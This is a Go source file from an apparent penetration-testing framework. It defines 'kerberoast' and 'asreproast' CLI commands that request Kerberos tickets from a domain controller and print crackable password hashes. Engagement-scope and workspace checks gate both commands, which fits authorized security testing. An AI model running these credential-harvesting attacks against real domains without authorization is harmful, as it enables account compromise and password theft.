package ad

import (
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/Debajyoti0-0/aether/internal/cli"
	"github.com/Debajyoti0-0/aether/internal/engagement"
	"github.com/Debajyoti0-0/aether/internal/engine/ad/kerberos"
	"github.com/Debajyoti0-0/aether/internal/engine/mutation"
	protokrb "github.com/Debajyoti0-0/aether/internal/protocol/kerberos"
	"github.com/spf13/cobra"
)

func newKerberoastCmd() *cobra.Command {
	var (
		domain      string
		dc          string
		spnList     string
		credsFile   string
		ccachePath  string
		maxRequests int
		rateLimit   time.Duration
		workspace   string
		engFile     string
	)

	cmd := &cobra.Command{
		Use:   "kerberoast",
		Short: "Kerberoast SPNs to extract crackable hashes",
		Long: `Request TGS tickets for SPNs and extract Kerberoast hashes (mode 13100).
Requires valid credentials (password or ccache) for the requesting account.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := requireEngagementScope(engFile, domain, dc, engagement.CapKerbRoast); err != nil {
				return err
			}

			ws, err := cli.OpenGovernedWorkspace(cli.GetWorkspaceFlag(cmd))
			if err != nil {
				return err
			}

			spns := []string{}
			if spnList != "" {
				data, err := os.ReadFile(spnList)
				if err != nil {
					return fmt.Errorf("read spn list: %w", err)
				}
				// Split into LINES, not runes (see EnumUsers fix rationale).
				for _, line := range strings.Split(string(data), "\n") {
					line = strings.TrimSpace(line)
					if line != "" {
						spns = append(spns, line)
					}
				}
			} else if len(args) > 0 {
				spns = args
			}

			if len(spns) == 0 {
				return fmt.Errorf("SPNs required via args or --spnlist")
			}

			credentials := make(map[string]string)
			var requestingUser string
			if credsFile != "" {
				data, err := os.ReadFile(credsFile)
				if err != nil {
					return fmt.Errorf("read creds file: %w", err)
				}
				// Format: user:password — the REQUESTING account whose TGT
				// authenticates the TGS-REQs. The previous code keyed creds by
				// target SPN, which never matched and produced
				// "no credentials for SPN ..." for every entry.
				for _, line := range strings.Split(string(data), "\n") {
					line = strings.TrimSpace(line)
					if line == "" {
						continue
					}
					parts := strings.SplitN(line, ":", 2)
					if len(parts) == 2 {
						requestingUser = parts[0]
						credentials["*"] = parts[1]
					}
				}
			}

			mut := &kerberos.KerberoastMutation{
				Domain:         domain,
				DC:             dc,
				SPNs:           spns,
				Credentials:    credentials,
				RequestingUser: requestingUser,
				CCachePath:     ccachePath,
				MaxRequests:    maxRequests,
				RateLimit:      rateLimit,
			}

			res, err := mutation.Run(cmd.Context(), ws, mut)
			if err != nil {
				return err
			}

			fmt.Printf("Action: %s\nStatus: %s\n", res.ActionID, res.Status)
			if cli.IsJSONOutput(cmd) {
				return cli.PrintJSON(map[string]any{
					"domain":  domain,
					"dc":      dc,
					"results": len(mut.Results),
					"errors":  len(mut.Errors),
				})
			}
			fmt.Printf("Kerberoasted %d SPNs\n", len(mut.Results))
			for _, r := range mut.Results {
				if r.Error != "" {
					fmt.Printf("  %s: %s\n", r.SPN, r.Error)
				} else {
					fmt.Printf("  %s -> %s (etype=%d hash=%s...)\n", r.SPN, r.Account, r.Etype, r.Hash[:16])
				}
			}
			for _, e := range mut.Errors {
				fmt.Printf("  ERROR: %s\n", e)
			}
			return nil
		},
	}

	cmd.Flags().StringVar(&domain, "domain", "", "Target domain (FQDN)")
	cmd.Flags().StringVar(&dc, "dc", "", "Domain controller hostname or IP")
	cmd.Flags().StringVar(&spnList, "spnlist", "", "Path to file with SPNs (one per line)")
	cmd.Flags().StringVar(&credsFile, "creds", "", "Path to file with SPN:password pairs")
	cmd.Flags().StringVar(&ccachePath, "ccache", "", "Path to ccache file for authentication")
	cmd.Flags().IntVar(&maxRequests, "max-requests", 0, "Maximum number of requests (0 = unlimited)")
	cmd.Flags().DurationVar(&rateLimit, "rate-limit", 0, "Rate limit between requests (e.g., 100ms)")
	cmd.Flags().StringVar(&workspace, "workspace", "", "Workspace name (required for governance)")
	bindEngagementFlag(cmd, &engFile)

	cmd.MarkFlagRequired("domain")
	cmd.MarkFlagRequired("dc")
	cmd.MarkFlagRequired("workspace")

	return cmd
}

func newASREPRoastCmd() *cobra.Command {
	var (
		domain    string
		dc        string
		userlist  string
		workspace string
		engFile   string
	)

	cmd := &cobra.Command{
		Use:   "asreproast",
		Short: "AS-REP roast accounts without pre-authentication",
		Long: `Request AS-REP for accounts without Kerberos pre-authentication.
Extracts AS-REP hashes (mode 18200) for offline cracking.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			if err := requireEngagementScope(engFile, domain, dc, engagement.CapKerbRoast); err != nil {
				return err
			}

			ws, err := cli.OpenGovernedWorkspace(cli.GetWorkspaceFlag(cmd))
			if err != nil {
				return err
			}

			usernames := []string{}
			if userlist != "" {
				data, err := os.ReadFile(userlist)
				if err != nil {
					return fmt.Errorf("read userlist: %w", err)
				}
				// Split into LINES, not runes: `for _, line := range string(data)`
				// iterates code points, turning every character into a "username".
				for _, line := range strings.Split(string(data), "\n") {
					line = strings.TrimSpace(line)
					if line != "" {
						usernames = append(usernames, line)
					}
				}
			} else if len(args) > 0 {
				usernames = args
			}

			if len(usernames) == 0 {
				return fmt.Errorf("usernames required via args or --userlist")
			}

			mut := &kerberos.ASREPRoastMutation{
				Domain: domain,
				DC:     dc,
				Users:  usernames,
			}

			res, err := mutation.Run(cmd.Context(), ws, mut)
			if err != nil {
				return err
			}

			fmt.Printf("Action: %s\nStatus: %s\n", res.ActionID, res.Status)
			if cli.IsJSONOutput(cmd) {
				return cli.PrintJSON(map[string]any{
					"domain":     domain,
					"dc":         dc,
					"results":    len(mut.Results),
					"skipped":    len(mut.Skipped),
					"roastable":  mut.Results,
					"notRoasted": mut.Skipped,
				})
			}
			fmt.Printf("AS-REP roasted %d of %d accounts (mode 18200/13100)\n", len(mut.Results), len(mut.Results)+len(mut.Skipped))
			for _, r := range mut.Results {
				if r.Error != "" {
					fmt.Printf("  %s: ERROR %s\n", r.Username, r.Error)
					continue
				}
				fmt.Printf("  %s -> %s (etype=%s mode=%d)\n    %s\n",
					r.Username, r.Principal, protokrb.EtypeName(r.Etype), r.HashMode, r.Hash)
			}
			if len(mut.Skipped) > 0 {
				fmt.Printf("Not roastable (%d):\n", len(mut.Skipped))
				for _, s := range mut.Skipped {
					fmt.Printf("  %s: %s\n", s.Username, s.Reason)
				}
			}
			return nil
		},
	}

	cmd.Flags().StringVar(&domain, "domain", "", "Target domain (FQDN)")
	cmd.Flags().StringVar(&dc, "dc", "", "Domain controller hostname or IP")
	cmd.Flags().StringVar(&userlist, "userlist", "", "Path to file with usernames (one per line)")
	cmd.Flags().StringVar(&workspace, "workspace", "", "Workspace name (required for governance)")
	bindEngagementFlag(cmd, &engFile)

	cmd.MarkFlagRequired("domain")
	cmd.MarkFlagRequired("dc")
	cmd.MarkFlagRequired("workspace")

	return cmd
}

func split(s, sep string, n int) []string {
	result := []string{}
	start := 0
	count := 0
	for i := 0; i <= len(s); i++ {
		if i == len(s) || (n > 0 && count >= n-1) {
			if i <= len(s) {
				result = append(result, s[start:i])
			}
			break
		}
		if i+len(sep) <= len(s) && s[i:i+len(sep)] == sep {
			result = append(result, s[start:i])
			start = i + len(sep)
			count++
		}
	}
	return result
}
